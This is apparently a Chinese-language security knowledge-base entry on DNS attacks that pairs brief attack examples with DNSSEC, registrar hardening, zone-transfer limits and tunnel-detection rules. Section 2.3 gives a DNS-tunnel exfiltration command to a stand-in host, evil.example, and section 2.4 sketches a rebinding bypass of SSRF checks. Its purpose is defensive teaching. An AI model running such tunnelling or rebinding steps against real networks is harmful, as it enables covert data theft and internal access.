# DNS 攻击 (DNS Attacks)

> 分类：网络层 / 名称解析 | 风险：高 | MITRE T1071.004 / T1584.001 | 攻击链：侦察 → 劫持 / C2

## 1. 攻击原理

DNS 是几乎所有访问的起点，也是检测的盲区。攻击面覆盖**解析、注册、委派、记录、隧道**五个环节：

| 类型 | 说明 |
|---|---|
| 缓存投毒 | 污染递归解析器缓存，返回恶意 IP（Kaminsky 攻击） |
| DNS 欺骗 | 伪造响应，抢先于真实应答 |
| 注册商劫持 | 盗取域名账号，改 NS 记录 |
| 子域接管 | 悬空 CNAME/A 记录指向已释放的云资源，被攻击者认领 |
| 区域传送泄露 | `AXFR` 未限制，泄露全部记录 |
| DNS 隧道 | 把数据封装进 DNS 查询，绕过出网管控（C2 / 外带） |
| DNS Rebinding | 同一域名前后解析到不同 IP，绕过 SSRF 的 IP 校验 |
| 仿冒域名 | Typosquatting、同形字，用于钓鱼（41） |
| DoH/DoT 滥用 | 加密 DNS 绕过企业检测 |

## 2. 攻击示例

### 2.1 区域传送泄露

```bash
dig AXFR @ns1.example.com example.com
# 若未限制，返回全部子域、内网记录、邮箱验证记录
```

### 2.2 子域接管

```text
旧配置：blog.example.com CNAME → mycompany.s3-website-us-east-1.amazonaws.com
S3 桶已删除但 DNS 记录未清理
→ 攻击者创建同名桶 → blog.example.com 指向攻击者内容
→ 可签发有效证书、托管钓鱼页、窃取 Cookie（若 Cookie 域为 .example.com）
```

```bash
# ✅ 巡检命令
dig +short blog.example.com CNAME
curl -sI https://blog.example.com | head -1
# CNAME 指向的云资源返回 NoSuchBucket / 404 即高风险
```

### 2.3 DNS 隧道

```bash
# 攻击者控制的权威 DNS：evil.example
# 受害主机（被植入木马）发起大量 TXT/A 查询
dig TXT $(echo -n "c2data" | base64).evil.example
```

单次载荷小、频率高，能绕过只允许 DNS 出网的网络。

### 2.4 DNS Rebinding（绕过 SSRF 防护）

```text
attacker.example 第一次解析 → 1.2.3.4（公网，通过校验）
TTL=0，第二次解析 → 127.0.0.1（内网）
服务端若二次解析，就访问到了内网
```

利用 `sslip.io`、`nip.io` 等通配 DNS 可快速构造。

## 3. 影响

- 流量被劫持到攻击者服务器（凭据、会话泄露）
- 子域接管导致可信域名被用于钓鱼与 Cookie 窃取
- 内网资产清单泄露
- C2 通道隐蔽，难以发现
- 绕过 SSRF / 出网管控

## 4. 防御措施

1. **DNSSEC**：为自有域启用签名，递归解析器开启验证。
2. **注册商加固**：MFA、Registrar Lock、域名到期提醒、注册邮箱独立且强认证。
3. **子域资产治理**：
   - 维护完整子域清单（含历史记录）
   - 定期扫描悬空 CNAME/A 记录
   - 云资源删除前先清理 DNS，或保留占位资源
   - 禁止第三方随意创建指向内部资源的 CNAME
4. **区域传送限制**：仅允许授权从服务器 AXFR，其余拒绝。
5. **DNS 过滤与出网控制**：
   - 内部强制企业 DNS，阻断直连 8.8.8.8 等
   - 限制 DoH/DoT 到白名单解析器
   - 监控异常查询量、超长标签、高频 TXT/NULL 记录（隧道特征）
6. **防 Rebinding**：
   - 解析后固定 IP 发起连接（见 `31-ssrf`）
   - 拒绝私有地址段
   - 校验 `Host` 与目标一致性
7. **CAA + CT 监控**：限制可签发证书的 CA；监控异常证书。
8. **邮件相关记录**：SPF / DKIM / DMARC 完整（见 `41-phishing`）。
9. **监控告警**：DNS 响应变化、NXDOMAIN 突增、单主机高频查询、异常域名长度。

## 5. 配置与检测对比

```dns
; ✅ DNSSEC + CAA + 关键记录
example.com.            IN SOA  ns1.example.com. hostmaster.example.com. (...)
example.com.            IN NS   ns1.example.com.
example.com.            IN NS   ns2.example.com.
example.com.            IN CAA  0 issue "letsencrypt.org"
example.com.            IN CAA  0 iodef "mailto:security@example.com"
_dmarc.example.com.     IN TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@example.com"
```

```bash
# ✅ BIND：限制区域传送
zone "example.com" {
    type master;
    file "/etc/bind/db.example.com";
    allow-transfer { 10.0.0.53; };   # 仅授权从服务器
};
```

```bash
# ✅ 子域接管巡检（简化）
for h in $(cat subdomains.txt); do
  cname=$(dig +short "$h" CNAME)
  [ -n "$cname" ] && echo "$h -> $cname"
done
# 对每个 CNAME 目标做云资源存在性检查（S3/Heroku/Azure/GitHub Pages 等）
```

```yaml
# ✅ 检测：DNS 隧道特征
- alert: DnsTunnelSuspected
  expr: |
    sum by (host) (rate(dns_query_total{query_type=~"TXT|NULL"}[5m])) > 5
  for: 10m
```

```yaml
# ✅ 检测：单主机查询量 / 标签长度异常
- alert: DnsVolumeAnomaly
  expr: sum by (host) (rate(dns_query_total[5m])) > 100
- alert: DnsLongLabel
  expr: dns_query_label_length_max > 50
```

## 6. 自查清单

- [ ] 自有域启用 DNSSEC 与 CAA
- [ ] 注册商开启 MFA + Registrar Lock
- [ ] 有完整子域清单并定期巡检悬空记录
- [ ] 云资源删除前清理 DNS 记录
- [ ] 区域传送仅授权从服务器
- [ ] 内网强制企业 DNS，阻断直连公共解析器
- [ ] DoH/DoT 受限在白名单
- [ ] 有 DNS 隧道与外带检测规则
- [ ] SSRF 防护固定解析 IP，防 Rebinding
- [ ] SPF/DKIM/DMARC 完整

## 7. 参考资料

- MITRE ATT&CK T1071.004: DNS
- MITRE ATT&CK T1584.001: Domains
- OWASP: DNS Security / Subdomain Takeover
- RFC 4033-4035（DNSSEC）
- CISA: DNS Security Best Practices
- 关联本库：`31-ssrf`、`41-phishing`、`46-mitm`
